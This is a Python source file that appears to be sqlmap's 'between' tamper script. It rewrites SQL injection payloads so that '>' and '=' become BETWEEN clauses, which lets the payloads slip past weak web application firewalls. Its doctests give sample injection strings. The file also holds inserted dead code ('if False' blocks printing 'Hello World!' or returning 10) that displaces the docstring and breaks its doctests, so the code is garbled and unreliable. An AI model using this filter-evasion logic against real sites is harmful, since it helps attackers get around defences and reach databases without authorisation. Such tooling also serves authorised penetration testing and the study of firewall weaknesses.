"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST

def dependencies():
    if False:
        print('Hello World!')
    pass

def tamper(payload, **kwargs):
    if False:
        return 10
    "\n    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the greater than character\n        * The BETWEEN clause is SQL standard. Hence, this tamper script\n          should work against all (?) databases\n\n    >>> tamper('1 AND A > B--')\n    '1 AND A NOT BETWEEN 0 AND B--'\n    >>> tamper('1 AND A = B--')\n    '1 AND A BETWEEN B AND B--'\n    >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')\n    '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'\n    "
    retVal = payload
    if payload:
        match = re.search('(?i)(\\b(AND|OR)\\b\\s+)(?!.*\\b(AND|OR)\\b)([^>]+?)\\s*>\\s*([^>]+)\\s*\\Z', payload)
        if match:
            _ = '%s %s NOT BETWEEN 0 AND %s' % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub("\\s*>\\s*(\\d+|'[^']+'|\\w+\\(\\d+\\))", ' NOT BETWEEN 0 AND \\g<1>', payload)
        if retVal == payload:
            match = re.search('(?i)(\\b(AND|OR)\\b\\s+)(?!.*\\b(AND|OR)\\b)([^=]+?)\\s*=\\s*([\\w()]+)\\s*', payload)
            if match:
                _ = '%s %s BETWEEN %s AND %s' % (match.group(2), match.group(4), match.group(5), match.group(5))
                retVal = retVal.replace(match.group(0), _)
    return retVal